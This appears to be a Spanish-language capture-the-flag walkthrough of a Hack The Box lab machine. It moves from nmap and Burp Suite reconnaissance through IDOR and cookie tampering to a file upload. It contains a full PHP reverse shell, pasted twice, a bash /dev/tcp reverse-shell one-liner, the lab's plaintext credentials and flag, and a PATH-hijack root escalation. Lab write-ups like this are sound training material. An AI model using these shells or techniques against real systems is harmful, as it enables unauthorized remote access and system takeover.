### nmap
#Linux
```python
sudo nmap -sCV 10.129.137.184
[sudo] password for parrot: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-06 15:53 BST
Nmap scan report for 10.129.137.184
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61e43fd41ee2b2f10d3ced36283667c7 (RSA)
|   256 241da417d4e32a9c905c30588f60778d (ECDSA)
|_  256 78030eb4a1afe5c2f98d29053e29c9f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.10 seconds
```
### Info
```css
admin@megacorp.com
```

### BurpSuite
```python
Configurar el BurpSuite
--FireFox
--Settings
--Network Settings
--Configure Proxy Access to the Internet --Manual proxy configuration
```
### en esta parte configuramos el proxy de HTTP con la iP: 127.0.0.1 y el puerto (Port): 8080. estos son los datos, tanto ip como puertos que vienen configurados por defecto en la herramienta burpsuite.

![[2023-10-06_11-46.png]]

### En el burpsuite podemos verlos y configurarlos de diferente manera si vamos a la opcion de settings:
![[2023-10-06_11-47.png]]

## en la pagina princial del burpsuite:

```python
---En la pagina principal del burp vamos a la pertana de proxy y 
--luego a la opcion de --intercept is --off y nos aseguramos de tenerla en --On 
--luego vamos a --OpenBrowaer esto nos abre una pestana del navegador preparada con el proxy para poder hacer nuestro reconocimiento web.
```
-------------------------------------------------------------------------------
![[2023-10-06_11-56.png]]

### Burpsuite

```python
--Si navegamos a la ip objetivo y damos un enter para despues volver al burpsuite podemos ver que ya el burp intercepto la peticion
```

![[2023-10-06_12-10 2.png]]
###### Ahora podemos ir a la parte de la ip o target en el burpsuite para ver toda la informacion que hemos recopilado.

![[2023-10-06_12-11.png]]

###### En esta parte podemos ver la direccion web: http://10.129.137.184 y dando click a la flechita podemos desplegar los direcctorios a los que esta accediendo esta direccion:  En el cuadro verde podemos ver la peticion que esta realizando la direccion web y en la parte de arriba podemos ver los subdominios a los que esta accediendo esta dreccion 

URL: Podemos ver las peticiones GET a los direfentes subdominios por ejemplo
```python
/cdn-cgi/login/
/cdn-cgi/login/admin.php
```

![[2023-10-06_12-14.png]]

### Vamos a navegar al subdominio /cdn-cgi/login/ para ver que nos encontramos:

###### para ello debemos apagar la intercepcion que hemos hecho con el burpSuite y navegar hasta la pg para revisar el subdominio que hemos encontrado

![[2023-10-06_12-38.png]]

#### Ok hemos encontrado una pagina de Log In que nos permite ingresar como Guest(Invitado)
###### Ingresamos y podemos ver lo siguiente

![[2023-10-06_13-57.png]]


##### Navegando por los enlaces de la pagina:

Index
```python
--Account
--Brandimg
--Clients
--/Uploads No tenemos acceso (This action require super admin rights.)
```


![[2023-10-06_14-03.png]]
-------------------------------------------------------------------------------------------------------------
![[2023-10-06_14-03_1.png]]
-------------------------------------------------------------------------------------------------------------
![[2023-10-06_14-03_2.png]]

##### Bien aqui podemos notar que tenemos informacion que podria ser importante.

Info:
```css
	------------------------------------------------------------------------------------
	--AccessID:2233
	--Name:guest
	--Email:guest@megacorp.com
	------------------------------------------------------------------------------------
	--BrandID:2 
	--Model:MC-2124
	--Price:$100,430
	------------------------------------------------------------------------------------
	--ClientID:2
	--Name:client
	--Email:client@client.htb
	------------------------------------------------------------------------------------
```

###### Si miramos con atencion la Url podemos notar que el subdominio termina en "accounts&id=2". esto podria ser una piasta ya que probablemente exista el usuario 1 o el usuario 3.

###### Si hacemos una pequena modificacion en: accounts&id=2 y lo reemplazamos por accounts&id=1. obtenemos informacion de usuario 1 en este caso es: 

![[2023-10-06_14-20.png]]

Info:
```css
	--AccessID:34322
	--Name:admin
	--Email:admin@megacorp.com
```

###### Ok necesitamos accesso como administrador para ver la pestana de #Uploads asi que vamos de nuevo al burpsuite e intentemos interceptar la peticion para cambiar nuestro AccessID de guest por el AccessID del usuario admin a ver si esto nos da mas informacion.

```css
	--:Burpsuite
	--:Intercep is On
	--:Ahora vamos a la pagia e intentamos entrat en Uploads
```

###### Notamos que la pagina se queda cargando asi que hemos interceptado la peticion correctamente. 
###### ahora Cambiamos la Cookie del Usuario guest por la cookie del usuario admin y el #role del usuario guest por admin: 


![[2023-10-06_14-51.png]]

###### Precionamos el boton #Forward para que la peticion con la modificacion que acabamos de hacer se envie y verificamos en la pagina.

![[2023-10-06_14-56.png]]

###### Podemos ver que ahora tenemos acceso a la pestana de Uploads. parace que podemos subir archivos a esta pagina. asi que intentaremos subir un archivo malisioso para intentar consegir una reverseShell

buscamos en internet una reverseshell.php

shell.php
```python
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?><?php


set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>

```

# Rshell.php
```python
<?php
    system("bash -c 'bash -i >& /dev/tcp/TUI-P/PUERTO 0>&1'")
?>
```


###### Tenemos que cambiar el la IP y el puerto por donde estaremos escuchando para conseguir la reverseshell.php

comando para generar el pront de la terminal
```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```


User.txt
```python
f2c74ee8db7983851ab2a96a44eb7981
```

#### Navegando al directorio donde se alija la pagina php podemos encontrar archivos interesantes.
User.
```python
'robert', 'M3g4C0rpUs3r!'
```

### El comando cat lo podemos convinar con grep para buscar archivos que contengan una palabra en espesifico. 

# code
```python
cat * | grep -i passw*
```
# Info
```python
($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
```

# bugtracker --help 

###### La herramienta acepta entradas del usuario como nombre del archivo que se leerá usando el comando cat; sin embargo, no especifica la ruta completa al archivo cat y, por lo tanto, podríamos aprovechar esto.

![[2023-10-09_01-18.png]]
### Navegaremos al directorio /tmp y crearemos un archivo llamado cat con el siguiente contenido: 
```python
	/bin/sh
```

### ahora otorgamos permisos de ejecución  
```python
	chmod +x cat
```

###### Para explotar esto, podemos añadir el directorio /tmp a la variable de entorno PATH
```python
	export PATH=/tmp:$PATH
```

###### haciendo echo $PATH podemos ver 
```python
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```
###### podemos ver que el directorio /tmp esta alojado dentro de la variable path

###### hacemos un nuevo llamado al bugtracker 
```python
bugtracker --help
```
###### seleccionamos la opción numero 2
![[2023-10-09_01-23.png]]
### WE ARE ROOT.